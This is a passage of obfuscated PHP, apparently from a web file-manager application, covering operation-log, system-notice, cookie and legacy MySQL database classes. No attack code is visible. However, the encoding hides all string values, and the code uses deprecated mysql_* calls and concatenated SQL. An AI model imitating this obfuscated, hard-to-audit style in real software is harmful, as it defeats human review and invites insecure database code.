!$£áâ©™[$ˆŒê¶¿…[2268]]) { return; } $ó×ôìÅ½ = get_client_ip(); if (!$£áâ©™ || strlen(json_encode($£áâ©™)) >= 1024) { $£áâ©™ = array($ˆŒê¶¿…[2269] => $ó×ôìÅ½); } else { if (is_array($£áâ©™)) { $£áâ©™[$ˆŒê¶¿…[2269]] = $ó×ôìÅ½; } else { $£áâ©™ = array($ˆŒê¶¿…[1203] => $£áâ©™, $ˆŒê¶¿…[2269] => $ó×ôìÅ½); } } $£áâ©™ = array($ˆŒê¶¿…[1654] => Session::sign(), $ˆŒê¶¿…[1655] => $ûÔ„·û, $ˆŒê¶¿…[33] => $€ÅÔñÎü, $ˆŒê¶¿…[1657] => json_encode($£áâ©™)); parent::add($£áâ©™); } public function remove($û¨ÕÖ”¾) { $this->where(array($_SERVER[ĞÂ¤àÓï][419] => $û¨ÕÖ”¾))->delete(); } private function _makeOrder($¹ˆòß„ = '') { $ØéúÅ‡ =& $_SERVER[ĞÂ¤àÓï]; $ÃØ®áÂ = $ØéúÅ‡[200]; $£ê›Ï ¢ = array($ØéúÅ‡[450] => $ØéúÅ‡[451], $ØéúÅ‡[452] => $ØéúÅ‡[453]); $…®à‚‰ = Input::get($ØéúÅ‡[458], $ØéúÅ‡[7], $ØéúÅ‡[2023], array($ØéúÅ‡[1945], $ØéúÅ‡[452])); $…®à‚‰ = $£ê›Ï ¢[$…®à‚‰]; $¹ˆòß„ = $¹ˆòß„ . "{$ÃØ®áÂ}\40{$…®à‚‰}"; return $this->order($¹ˆòß„); } public function get($éÈĞÇìì = '') { $É«ğÈ­ =& $_SERVER[ĞÂ¤àÓï]; if (!$éÈĞÇìì) { show_json(array()); } $áåÃª®† = array(); if ($éÈĞÇìì[$É«ğÈ­[1664]]) { $áåÃª®†[$É«ğÈ­[1664]] = $éÈĞÇìì[$É«ğÈ­[1664]]; } if (isset($éÈĞÇìì[$É«ğÈ­[760]])) { $¢Šì˜²³ = $éÈĞÇìì[$É«ğÈ­[760]]; $¸ÂÎùü° = isset($éÈĞÇìì[$É«ğÈ­[497]]) ? $éÈĞÇìì[$É«ğÈ­[497]] : time(); $áåÃª®†[$É«ğÈ­[200]] = array($É«ğÈ­[333], array($¢Šì˜²³, $¸ÂÎùü°)); } if ($éÈĞÇìì[$É«ğÈ­[33]]) { $¡–ñ¬‹î = explode($É«ğÈ­[50], $éÈĞÇìì[$É«ğÈ­[33]]); $„ÇÉşÚ = $this->typeFile(); $Æí¦öé¡ = array(); foreach ($¡–ñ¬‹î as $‡ƒ™ÈÕÇ) { $Æí¦öé¡[] = $‡ƒ™ÈÕÇ; if (isset($„ÇÉşÚ[$‡ƒ™ÈÕÇ])) { $Æí¦öé¡ = array_merge($Æí¦öé¡, $„ÇÉşÚ[$‡ƒ™ÈÕÇ]); } } $Æí¦öé¡ = array_unique($Æí¦öé¡); if ($Æí¦öé¡) { $áåÃª®†[$É«ğÈ­[33]] = array($É«ğÈ­[7], $Æí¦öé¡); } } else { $áåÃª®†[$É«ğÈ­[33]] = array($É«ğÈ­[2270], $É«ğÈ­[2271]); } if (!empty($éÈĞÇìì[$É«ğÈ­[2269]])) { $áåÃª®†[$É«ğÈ­[453]] = array($É«ğÈ­[383], "\45{$éÈĞÇìì[$É«ğÈ­[2269]]}\x25"); } $Ïòü«·¯ = $this->_makeOrder()->where($áåÃª®†)->selectPage(); if (empty($Ïòü«·¯[$É«ğÈ­[369]])) { show_json(array(), !0, $Ïòü«·¯[$É«ğÈ­[366]]); } $Ïòü«·¯[$É«ğÈ­[369]] = $this->logList($Ïòü«·¯[$É«ğÈ­[369]]); return $Ïòü«·¯; } private function ipAddress(&$›õĞİ¦ß) { $ü´áÚŸÖ =& $_SERVER[ĞÂ¤àÓï]; if (!empty($›õĞİ¦ß[$ü´áÚŸÖ[2269]])) { $Ñ´ìµÆÄ = IpLocation::get($›õĞİ¦ß[$ü´áÚŸÖ[2269]]); } else { $Ñ´ìµÆÄ = LNG($ü´áÚŸÖ[2272]); } $›õĞİ¦ß[$ü´áÚŸÖ[2273]] = $Ñ´ìµÆÄ; } private function descZipDownload($Óù‡¶†, &$¶°Ó™áé) { $˜ìÊÒß =& $_SERVER[ĞÂ¤àÓï]; if (!isset($Óù‡¶†[$˜ìÊÒß[2274]])) { return; } $ÂÅÉ€“ü = json_decode($Óù‡¶†[$˜ìÊÒß[2274]], !0); foreach ($ÂÅÉ€“ü as $šçÄÃ») { try { $Ş¯ó¦µ = IO::infoFull($šçÄÃ»[$˜ìÊÒß[84]]); } catch (Exception $›Œé‡Â¾) { continue; } $Óù‡¶†[$˜ìÊÒß[84]] = $šçÄÃ»[$˜ìÊÒß[84]]; $¶°Ó™áé[] = $Óù‡¶†[$˜ìÊÒß[402]] = $Ş¯ó¦µ[$˜ìÊÒß[402]]; $¶°Ó™áé[] = $Óù‡¶†[$˜ìÊÒß[2077]] = $Ş¯ó¦µ[$˜ìÊÒß[432]]; break; } return $Óù‡¶†; } private function getSourceList(&$æËÊü›¾) { $Ì„ëÎ‹µ =& $_SERVER[ĞÂ¤àÓï]; $³•ÇìšÁ = array(); foreach ($æËÊü›¾ as $œ²ÇöÁ± => $¤„²ß÷½) { $ò°ö€÷ = json_decode($¤„²ß÷½[$Ì„ëÎ‹µ[453]], !0); if ($¤„²ß÷½[$Ì„ëÎ‹µ[33]] == $Ì„ëÎ‹µ[1828]) { $ò°ö€÷ = $this->descZipDownload($ò°ö€÷, $³•ÇìšÁ); $æËÊü›¾[$œ²ÇöÁ±][$Ì„ëÎ‹µ[453]] = json_encode($ò°ö€÷); continue; } if (strpos($¤„²ß÷½[$Ì„ëÎ‹µ[33]], $Ì„ëÎ‹µ[2079]) !== 0) { if (!isset($ò°ö€÷[$Ì„ëÎ‹µ[84]]) || strpos($¤„²ß÷½[$Ì„ëÎ‹µ[33]], $Ì„ëÎ‹µ[2275]) !== 0) { continue; } try { $³ûÅ§Ñ± = IO::infoFull($ò°ö€÷[$Ì„ëÎ‹µ[84]]); } catch (Exception $Ã­óª¯“) { continue; } $³•ÇìšÁ[] = $ò°ö€÷[$Ì„ëÎ‹µ[402]] = $³ûÅ§Ñ±[$Ì„ëÎ‹µ[402]]; $³•ÇìšÁ[] = $ò°ö€÷[$Ì„ëÎ‹µ[2077]] = $³ûÅ§Ñ±[$Ì„ëÎ‹µ[432]]; $æËÊü›¾[$œ²ÇöÁ±][$Ì„ëÎ‹µ[453]] = json_encode($ò°ö€÷); continue; } $³•ÇìšÁ[] = $ò°ö€÷[$Ì„ëÎ‹µ[402]]; $³•ÇìšÁ[] = $ò°ö€÷[$Ì„ëÎ‹µ[2077]]; if ($ò°ö€÷[$Ì„ëÎ‹µ[33]] == $Ì„ëÎ‹µ[557]) { $³•ÇìšÁ[] = $ò°ö€÷[$Ì„ëÎ‹µ[453]][$Ì„ëÎ‹µ[1160]]; $³•ÇìšÁ[] = $ò°ö€÷[$Ì„ëÎ‹µ[453]][$Ì„ëÎ‹µ[1161]]; } if ($ò°ö€÷[$Ì„ëÎ‹µ[33]] == $Ì„ëÎ‹µ[2087]) { $³•ÇìšÁ[] = $ò°ö€÷[$Ì„ëÎ‹µ[453]][$Ì„ëÎ‹µ[402]]; } } if (!$³•ÇìšÁ) { return array(); } return Model($Ì„ëÎ‹µ[832])->sourceListInfo($³•ÇìšÁ, !0); } private function logList($°ÌáâÊ£) { $„¥ÆõŠ¾ =& $_SERVER[ĞÂ¤àÓï]; $ƒä€êï = array_to_keyvalue($°ÌáâÊ£, $„¥ÆõŠ¾[12], $„¥ÆõŠ¾[1664]); $ŒªËúÒ… = Model($„¥ÆõŠ¾[535])->userListInfo(array_unique($ƒä€êï)); $ˆ×¯¢–ü = $this->getSourceList($°ÌáâÊ£); $¤ö·šÀı = $this->typeAll(); $ƒ‚Ä‡ğğ = array(); $áºîô“› = array(); foreach ($°ÌáâÊ£ as $½»˜ö²¬ => $×™¹ìÚƒ) { $‘—åöáÀ = $×™¹ìÚƒ[$„¥ÆõŠ¾[33]]; $´€ï‘àô = isset($ŒªËúÒ…[$×™¹ìÚƒ[$„¥ÆõŠ¾[1664]]]) ? $ŒªËúÒ…[$×™¹ìÚƒ[$„¥ÆõŠ¾[1664]]] : !1; $üñ°€ = strpos($‘—åöáÀ, $„¥ÆõŠ¾[2276]) === 0 ? LNG($„¥ÆõŠ¾[2277]) : LNG($„¥ÆõŠ¾[2272]); $×™¹ìÚƒ[$„¥ÆõŠ¾[32]] = isset($´€ï‘àô[$„¥ÆõŠ¾[32]]) ? $´€ï‘àô[$„¥ÆõŠ¾[32]] : LNG($„¥ÆõŠ¾[2272]); $×™¹ìÚƒ[$„¥ÆõŠ¾[542]] = isset($´€ï‘àô[$„¥ÆõŠ¾[542]]) ? $´€ï‘àô[$„¥ÆõŠ¾[542]] : $„¥ÆõŠ¾[12]; $×™¹ìÚƒ[$„¥ÆõŠ¾[1564]] = isset($¤ö·šÀı[$‘—åöáÀ]) ? $¤ö·šÀı[$‘—åöáÀ] : $üñ°€; $×™¹ìÚƒ[$„¥ÆõŠ¾[2022]] = $´€ï‘àô; $­‹òº¥â = json_decode($×™¹ìÚƒ[$„¥ÆõŠ¾[453]], !0); $×™¹ìÚƒ[$„¥ÆõŠ¾[2269]] = isset($­‹òº¥â[$„¥ÆõŠ¾[2269]]) ? $­‹òº¥â[$„¥ÆõŠ¾[2269]] : $„¥ÆõŠ¾[12]; $×™¹ìÚƒ[$„¥ÆõŠ¾[2273]] = IpLocation::get($×™¹ìÚƒ[$„¥ÆõŠ¾[2269]]); if (strpos($‘—åöáÀ, $„¥ÆõŠ¾[2079]) === 0 || isset($­‹òº¥â[$„¥ÆõŠ¾[2077]])) { $­‹òº¥â[$„¥ÆõŠ¾[86]] = $ˆ×¯¢–ü[$­‹òº¥â[$„¥ÆõŠ¾[402]]]; $­‹òº¥â[$„¥ÆõŠ¾[2092]] = $ˆ×¯¢–ü[$­‹òº¥â[$„¥ÆõŠ¾[2077]]]; if ($­‹òº¥â[$„¥ÆõŠ¾[33]] == $„¥ÆõŠ¾[557]) { $­‹òº¥â[$„¥ÆõŠ¾[453]][$„¥ÆõŠ¾[1160]] = $ˆ×¯¢–ü[$­‹òº¥â[$„¥ÆõŠ¾[453]][$„¥ÆõŠ¾[1160]]]; $­‹òº¥â[$„¥ÆõŠ¾[453]][$„¥ÆõŠ¾[1161]] = $ˆ×¯¢–ü[$­‹òº¥â[$„¥ÆõŠ¾[453]][$„¥ÆõŠ¾[1161]]]; } if ($­‹òº¥â[$„¥ÆõŠ¾[33]] == $„¥ÆõŠ¾[2087]) { $­‹òº¥â[$„¥ÆõŠ¾[453]][$„¥ÆõŠ¾[402]] = $ˆ×¯¢–ü[$­‹òº¥â[$„¥ÆõŠ¾[453]][$„¥ÆõŠ¾[402]]]; } if ($­‹òº¥â[$„¥ÆõŠ¾[33]] == $„¥ÆõŠ¾[1823]) { $­‹òº¥â[$„¥ÆõŠ¾[2092]] = $­‹òº¥â[$„¥ÆõŠ¾[86]]; $­‹òº¥â[$„¥ÆõŠ¾[2077]] = $­‹òº¥â[$„¥ÆõŠ¾[2092]][$„¥ÆõŠ¾[402]]; $­‹òº¥â[$„¥ÆõŠ¾[86]] = !1; $­‹òº¥â[$„¥ÆõŠ¾[402]] = $„¥ÆõŠ¾[12]; } if ($­‹òº¥â[$„¥ÆõŠ¾[86]] && $­‹òº¥â[$„¥ÆõŠ¾[86]][$„¥ÆõŠ¾[411]] == $„¥ÆõŠ¾[1285]) { $áºîô“›[] = $×™¹ìÚƒ[$„¥ÆõŠ¾[399]]; unset($°ÌáâÊ£[$½»˜ö²¬]); continue; } if ($­‹òº¥â[$„¥ÆõŠ¾[2092]] && $­‹òº¥â[$„¥ÆõŠ¾[2092]][$„¥ÆõŠ¾[411]] == $„¥ÆõŠ¾[1285]) { $áºîô“›[] = $×™¹ìÚƒ[$„¥ÆõŠ¾[399]]; unset($°ÌáâÊ£[$½»˜ö²¬]); continue; } } $×™¹ìÚƒ[$„¥ÆõŠ¾[453]] = $­‹òº¥â; unset($×™¹ìÚƒ[$„¥ÆõŠ¾[2278]]); $ƒ‚Ä‡ğğ[] = $×™¹ìÚƒ; } $this->clearSystemPathLog($áºîô“›); return $ƒ‚Ä‡ğğ; } private function clearSystemPathLog($Á®ıîÍé) { $ùÖá¨ùâ =& $_SERVER[ĞÂ¤àÓï]; if (count($Á®ıîÍé) == 0) { return; } $¡¹ò°üı = array($ùÖá¨ùâ[399] => array($ùÖá¨ùâ[7], array_unique($Á®ıîÍé))); $this->where($¡¹ò°üı)->delete(); } public function deviceList($¦í½Ê©», $ëÊ«¸¨Ã = 0) { $­×õ¼‰¾ =& $_SERVER[ĞÂ¤àÓï]; $Ïœ¢Ç½½ = array($­×õ¼‰¾[1664] => $¦í½Ê©», $­×õ¼‰¾[200] => array($­×õ¼‰¾[1014], $ëÊ«¸¨Ã), $­×õ¼‰¾[33] => $­×õ¼‰¾[1797]); $»™ƒïàÔ = array(); $æ¦×üá = $this->field($­×õ¼‰¾[2279])->where($Ïœ¢Ç½½)->order($­×õ¼‰¾[2090])->limit(50)->select(); foreach ($æ¦×üá as $´¿–õà => $Ó÷ƒÕçõ) { if ($´¿–õà > 0 && abs($Ó÷ƒÕçõ[$­×õ¼‰¾[200]] - $æ¦×üá[$´¿–õà - 1][$­×õ¼‰¾[200]]) < 5) { continue; } $À†õïê = json_decode($Ó÷ƒÕçõ[$­×õ¼‰¾[453]], !0); $Ó÷ƒÕçõ[$­×õ¼‰¾[2269]] = isset($À†õïê[$­×õ¼‰¾[2269]]) ? $À†õïê[$­×õ¼‰¾[2269]] : $­×õ¼‰¾[12]; unset($À†õïê[$­×õ¼‰¾[2269]]); $‘êÛ˜Ïğ = $this->deviceType($À†õïê[$­×õ¼‰¾[2080]]); if (isset($»™ƒïàÔ[$‘êÛ˜Ïğ])) { continue; } $Ó÷ƒÕçõ[$­×õ¼‰¾[2273]] = IpLocation::get($Ó÷ƒÕçõ[$­×õ¼‰¾[2269]]); $Ó÷ƒÕçõ[$­×õ¼‰¾[453]] = $À†õïê; $»™ƒïàÔ[$‘êÛ˜Ïğ] = $Ó÷ƒÕçõ; } return array_values($»™ƒïàÔ); } public function deviceType($·é­Ã›) { return $·é­Ã›; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\x6e\157\164\151\143\x65\114\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\143\157\156\164\x65\156\164", "\141\165\164\150", "\x6d\x6f\144\145", "\164\x69\x6d\x65", "\164\x79\x70\145", "\154\x65\166\x65\x6c", "\x65\x6e\x61\142\154\x65", "\163\x6f\x72\164"); public function listData($ŠÖ–Œ‘— = false, $éÑ´íÛ× = "\163\157\x72\x74", $ªñ™×İ“ = false) { return parent::listData($ŠÖ–Œ‘—, $éÑ´íÛ×, $ªñ™×İ“); } public function add($‚ªà—È) { $İ‘ıß³ =& $_SERVER[ĞÂ¤àÓï]; $áĞ§ûÈ = time(); if ($‚ªà—È[$İ‘ıß³[16]] == $İ‘ıß³[2280]) { $áĞ§ûÈ = strtotime($‚ªà—È[$İ‘ıß³[203]]); } $‚ªà—È[$İ‘ıß³[203]] = $áĞ§ûÈ; return parent::insert($‚ªà—È); } public function update($‡ÅÏ°Ã, $‰øæ½¬¹) { $æ€»¦ëß =& $_SERVER[ĞÂ¤àÓï]; $¢¢¶ùÇİ = $this->listData($‡ÅÏ°Ã); if (!$¢¢¶ùÇİ) { return !1; } $é¬Ó˜£» = time(); if ($‰øæ½¬¹[$æ€»¦ëß[16]] == $æ€»¦ëß[2280]) { $é¬Ó˜£» = strtotime($‰øæ½¬¹[$æ€»¦ëß[203]]); } $‰øæ½¬¹[$æ€»¦ëß[203]] = $é¬Ó˜£»; return parent::update($‡ÅÏ°Ã, $‰øæ½¬¹); } public function remove($ Š©æÌ¡) { $Æš«£ø = $this->listData($ Š©æÌ¡); if (!$Æš«£ø || $Æš«£ø[$_SERVER[ĞÂ¤àÓï][1285]]) { return !1; } return parent::remove($ Š©æÌ¡); } public function sort($¯àÔûÄÚ, $©Ÿâß†) { return parent::update($¯àÔûÄÚ, $©Ÿâß†); } public function enable($şı‡Šø‹, $³ÖÑôÓù) { return parent::update($şı‡Šø‹, array($_SERVER[ĞÂ¤àÓï][2281] => $³ÖÑôÓù)); } private function initUserOption() { $†ø›¿Áé =& $_SERVER[ĞÂ¤àÓï]; $this->optionType = $†ø›¿Áé[2282]; $this->modelType = $†ø›¿Áé[2283]; $this->field = array($†ø›¿Áé[2284], $†ø›¿Áé[32], $†ø›¿Áé[203], $†ø›¿Áé[33], $†ø›¿Áé[2285], $†ø›¿Áé[749], $†ø›¿Áé[195]); } public function userNoticeGet($øêäúï = false) { $this->initUserOption(); return parent::listData($øêäúï, $_SERVER[ĞÂ¤àÓï][399], !0); } public function userNoticeAdd($…ğ¢©»¥) { $‹™àŠİ’ =& $_SERVER[ĞÂ¤àÓï]; $this->initUserOption(); $¼€ØµÙ€ = $this->findByKey($‹™àŠİ’[2284], $…ğ¢©»¥[$‹™àŠİ’[399]]); if ($¼€ØµÙ€) { return !0; } $Ô«ˆ¶ÕÁ = array($‹™àŠİ’[2284] => $…ğ¢©»¥[$‹™àŠİ’[399]], $‹™àŠİ’[32] => $…ğ¢©»¥[$‹™àŠİ’[32]], $‹™àŠİ’[203] => $…ğ¢©»¥[$‹™àŠİ’[203]], $‹™àŠİ’[33] => isset($…ğ¢©»¥[$‹™àŠİ’[33]]) ? $…ğ¢©»¥[$‹™àŠİ’[33]] : 1, $‹™àŠİ’[2285] => isset($…ğ¢©»¥[$‹™àŠİ’[2285]]) ? $…ğ¢©»¥[$‹™àŠİ’[2285]] : 0, $‹™àŠİ’[749] => 0, $‹™àŠİ’[195] => 0); return parent::insert($Ô«ˆ¶ÕÁ); } public function userNoticeEdit($È‹—®ö, $ÃğÓÊı¶) { $this->initUserOption(); return parent::update($È‹—®ö, $ÃğÓÊı¶); } } goto E…æÙ¶ë§ã; DåÁäí¿‘: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($î¾È¢èß = '', $ÁÙ”ëµ = 0) { if (is_string($î¾È¢èß) && $î¾È¢èß != $_SERVER[ĞÂ¤àÓï][12]) { $this->prefix = $î¾È¢èß; } if (is_numeric($ÁÙ”ëµ) && $ÁÙ”ëµ > 0) { $this->expire = $ÁÙ”ëµ; } } public static function getInstance() { static $Ò¿¯Ê†à; if ($Ò¿¯Ê†à === null) { $Ò¿¯Ê†à = new self(); } return $Ò¿¯Ê†à; } private static $cookieDisable = false; public static function disable($óÛ¥ëö) { self::$cookieDisable = $óÛ¥ëö; } private static $sameCookieSet = array(); public static function set($µ¿Òá, $Ú‚“ÀñÕ, $çñµÈóå = 0, $Ô±‹¥‘º = false, $Õ®§½£Ì = false) { $îƒ¥Õî¥ =& $_SERVER[ĞÂ¤àÓï]; if (self::$cookieDisable) { return; } if (!$çñµÈóå) { $çñµÈóå = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$µ¿Òá]) && self::$sameCookieSet[$µ¿Òá] == $Ú‚“ÀñÕ . $çñµÈóå) { return; } self::$sameCookieSet[$µ¿Òá] = $Ú‚“ÀñÕ . $çñµÈóå; if (!$Õ®§½£Ì) { $Õ®§½£Ì = str_replace(HOST, $îƒ¥Õî¥[12], APP_HOST); $Õ®§½£Ì = _get($GLOBALS, $îƒ¥Õî¥[882], $Õ®§½£Ì); } $†¾‹Ã²ú = $îƒ¥Õî¥[12]; setcookie($µ¿Òá, $Ú‚“ÀñÕ, time() + $çñµÈóå, $îƒ¥Õî¥[8] . trim($Õ®§½£Ì, $îƒ¥Õî¥[8]) . $†¾‹Ã²ú, !1, !1, $Ô±‹¥‘º); } public static function setSafe($¹øÃæ²Æ, $¹Ô·­¸®, $õ¡ÎÈš· = 0) { self::set($¹øÃæ²Æ, $¹Ô·­¸®, $õ¡ÎÈš·, !0); } public static function get($””Šâƒ) { static $Ûëô…çİ = false; if (!$Ûëô…çİ) { self::initHeaderCookie(); $Ûëô…çİ = !0; } return isset($_COOKIE[$””Šâƒ]) ? $_COOKIE[$””Šâƒ] : !1; } private static function initHeaderCookie() { $æÌñÜ‹¼ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($_SERVER[$æÌñÜ‹¼[883]]) || !$_SERVER[$æÌñÜ‹¼[883]]) { return; } $—Ò¯¶áû = explode($æÌñÜ‹¼[71], $_SERVER[$æÌñÜ‹¼[883]]); foreach ($—Ò¯¶áû as $ÊÃÂëü²) { $ÊÃÂëü² = explode($æÌñÜ‹¼[884], $ÊÃÂëü²); if (count($ÊÃÂëü²) != 2 || !isset($ÊÃÂëü²[1])) { continue; } $_COOKIE[trim($ÊÃÂëü²[0])] = trim($ÊÃÂëü²[1]); } } public static function remove($êÔë’ ö, $šÑäœÕ = false) { unset($_COOKIE[$êÔë’ ö]); self::set($êÔë’ ö, $_SERVER[ĞÂ¤àÓï][12], 1, $šÑäœÕ); } } class DbMysql extends Db { public function __construct($ù÷¼¼‘ = '') { $„À¢öŸ =& $_SERVER[ĞÂ¤àÓï]; if (!extension_loaded($„À¢öŸ[811])) { think_exception(think_lang($„À¢öŸ[14]) . $„À¢öŸ[885]); } if (!empty($ù÷¼¼‘)) { $this->config = $ù÷¼¼‘; if (empty($this->config[$„À¢öŸ[17]])) { $this->config[$„À¢öŸ[17]] = $„À¢öŸ[12]; } } } public function connect($‚»ú®şª = '', $Ôè‡õº° = 0, $“¤‡Äï‡ = false) { $öÑÂÚÖ¬ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($this->linkID[$Ôè‡õº°])) { if (empty($‚»ú®şª)) { $‚»ú®şª = $this->config; } $áƒÍË = $‚»ú®şª[$öÑÂÚÖ¬[886]] . ($‚»ú®şª[$öÑÂÚÖ¬[887]] ? "\x3a{$‚»ú®şª[$öÑÂÚÖ¬[887]]}" : $öÑÂÚÖ¬[12]); $ê¹ˆ€² = !empty($‚»ú®şª[$öÑÂÚÖ¬[17]][$öÑÂÚÖ¬[18]]) ? $‚»ú®şª[$öÑÂÚÖ¬[17]][$öÑÂÚÖ¬[18]] : $this->pconnect; if ($ê¹ˆ€²) { $this->linkID[$Ôè‡õº°] = mysql_pconnect($áƒÍË, $‚»ú®şª[$öÑÂÚÖ¬[888]], $‚»ú®şª[$öÑÂÚÖ¬[889]], 131072); } else { $this->linkID[$Ôè‡õº°] = mysql_connect($áƒÍË, $‚»ú®şª[$öÑÂÚÖ¬[888]], $‚»ú®şª[$öÑÂÚÖ¬[889]], !0, 131072); } if (!$this->linkID[$Ôè‡õº°] || !empty($‚»ú®şª[$öÑÂÚÖ¬[21]]) && !mysql_select_db($‚»ú®şª[$öÑÂÚÖ¬[21]], $this->linkID[$Ôè‡õº°])) { think_exception(mysql_error()); } $ç¯İì¿ü = mysql_get_server_info($this->linkID[$Ôè‡õº°]); mysql_query($öÑÂÚÖ¬[890] . think_config($öÑÂÚÖ¬[891]) . $öÑÂÚÖ¬[58], $this->linkID[$Ôè‡õº°]); if ($ç¯İì¿ü > $öÑÂÚÖ¬[892]) { mysql_query($öÑÂÚÖ¬[893], $this->linkID[$Ôè‡õº°]); } $this->connected = !0; if (1 != think_config($öÑÂÚÖ¬[22])) { unset($this->config); } } return $this->linkID[$Ôè‡õº°]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($áŞÎÌÌ) { $ã³ †×û =& $_SERVER[ĞÂ¤àÓï]; if (0 === stripos($áŞÎÌÌ, $ã³ †×û[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $áŞÎÌÌ; if ($this->queryID) { $this->free(); } think_action_status($ã³ †×û[23], 1); think_status($ã³ †×û[24]); $this->queryID = mysql_query($áŞÎÌÌ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($‚ÓØÊ£¼) { $ÜäÆ¿ˆ„ =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‚ÓØÊ£¼; if ($this->queryID) { $this->free(); } think_action_status($ÜäÆ¿ˆ„[25], 1); think_status($ÜäÆ¿ˆ„[24]); $í—€¬Ğ› = mysql_query($‚ÓØÊ£¼, $this->_linkID); $this->debug(); if (!1 === $í—€¬Ğ›) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ĞÂ¤àÓï][894], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚±à¥«± = mysql_query($_SERVER[ĞÂ¤àÓï][895], $this->_linkID); $this->transTimes = 0; if (!$‚±à¥«±) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ö¿‰¶Ë = mysql_query($_SERVER[ĞÂ¤àÓï][896], $this->_linkID); $this->transTimes = 0; if (!$Ö¿‰¶Ë) { $this->error(); return !1; } } return !0; } private function getAll() { $§ÔÏ•íÖ = array(); if ($this->numRows > 0) { while ($šº†»¸ã = mysql_fetch_assoc($this->queryID)) { $§ÔÏ•íÖ[] = $šº†»¸ã; } mysql_data_seek($this->queryID, 0); } return $§ÔÏ•íÖ; } public function getFields($Ã¯´…‰Ö) { $–¹ÃÇÀú =& $_SERVER[ĞÂ¤àÓï]; $Ö¤Œ‘íÕ = $this->query($–¹ÃÇÀú[897] . $this->parseKey($Ã¯´…‰Ö)); $ª‚˜“öé = array(); if ($Ö¤Œ‘íÕ) { foreach ($Ö¤Œ‘íÕ as $»Óüı¼ => $õ³ıÀ¹) { $ª‚˜“öé[$õ³ıÀ¹[$–¹ÃÇÀú[31]]] = array($–¹ÃÇÀú[32] => $õ³ıÀ¹[$–¹ÃÇÀú[31]], $–¹ÃÇÀú[33] => $õ³ıÀ¹[$–¹ÃÇÀú[34]], $–¹ÃÇÀú[35] => (bool) (strtoupper($õ³ıÀ¹[$–¹ÃÇÀú[36]]) === $–¹ÃÇÀú[898]), $–¹ÃÇÀú[37] => $õ³ıÀ¹[$–¹ÃÇÀú[38]], $–¹ÃÇÀú[39] => strtolower($õ³ıÀ¹[$–¹ÃÇÀú[40]]) == $–¹ÃÇÀú[41], $–¹ÃÇÀú[42] => strtolower($õ³ıÀ¹[$–¹ÃÇÀú[43]]) == $–¹ÃÇÀú[44]); } } return $ª‚˜“öé; } public function getTables($åÀ–Çø = '') { $…—ùóÃ =& $_SERVER[ĞÂ¤àÓï]; if (!empty($åÀ–Çø)) { $¦œï¼¨ = $…—ùóÃ[899] . $åÀ–Çø . $…—ùóÃ[900]; } else { $¦œï¼¨ = $…—ùóÃ[901]; } $ÙÄ—Šş‹ = $this->query($¦œï¼¨); $á”€Û¡Í = array(); foreach ($ÙÄ—Šş‹ as $ÊÕ¢è‡ => $ƒûêûúê) { $á”€Û¡Í[$ÊÕ¢è‡] = current($ƒûêûúê); } return $á”€Û¡Í; } public function replace($ğà–ºû“, $„ËÔµ¼Â = array()) { $ÉØÊ£‡Ì =& $_SERVER[ĞÂ¤àÓï]; foreach ($ğà–ºû“ as $ï­ıâÎ => $™ÏË€òÁ) { $ò—şÎ‘Á = $this->parseValue($™ÏË€òÁ); if (is_scalar($ò—şÎ‘Á)) { $ÂôÀæŒ„[] = $ò—şÎ‘Á; $«ø÷¹µ®[] = $this->parseKey($ï­ıâÎ); } } $í²Üï­Ô = $ÉØÊ£‡Ì[902] . $this->parseTable($„ËÔµ¼Â[$ÉØÊ£‡Ì[279]]) . $ÉØÊ£‡Ì[903] . implode($ÉØÊ£‡Ì[50], $«ø÷¹µ®) . $ÉØÊ£‡Ì[904] . implode($ÉØÊ£‡Ì[50], $ÂôÀæŒ„) . $ÉØÊ£‡Ì[905]; return $this->execute($í²Üï­Ô); } public function insertAll($ÆïÆ›Ãƒ, $ìïÜ’É¥ = array(), $Ì×Áü‹¦ = false) { $•ïŠÎĞ¡ =& $_SERVER[ĞÂ¤àÓï]; if (!is_array($ÆïÆ›Ãƒ[0])) { return !1; } $å¦ÂŸıÓ = array_keys($ÆïÆ›Ãƒ[0]); $Á¡ûìÍª = array(); foreach ($ÆïÆ›Ãƒ as $€Ã„ç«¦) { $¶‹„¦şí = array(); foreach ($€Ã„ç«¦ as $²ËÈú²‚ => $×Š™¥¡ç) { $×Š™¥¡ç = $this->parseValue($×Š™¥¡ç); if (is_scalar($×Š™¥¡ç)) { $¶‹„¦şí[] = $×Š™¥¡ç; } } $Á¡ûìÍª[] = $•ïŠÎĞ¡[260] . implode($•ïŠÎĞ¡[50], $¶‹„¦şí) . $•ïŠÎĞ¡[905]; } array_walk($å¦ÂŸıÓ, array($this, $•ïŠÎĞ¡[906])); $êâ™„Ïã = ($Ì×Áü‹¦ ? $•ïŠÎĞ¡[907] : $•ïŠÎĞ¡[908]) . $•ïŠÎĞ¡[909] . $this->parseTable($ìïÜ’É¥[$•ïŠÎĞ¡[279]]) . $•ïŠÎĞ¡[903] . implode($•ïŠÎĞ¡[50], $å¦ÂŸıÓ) . $•ïŠÎĞ¡[910] . implode($•ïŠÎĞ¡[50], $Á¡ûìÍª); return $this->execute($êâ™„Ïã); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $–å—Ğ«² =& $_SERVER[ĞÂ¤àÓï]; $this->error = mysql_errno() . $–å—Ğ«²[4] . mysql_error($this->_linkID); if ($–å—Ğ«²[12] != $this->queryStr) { 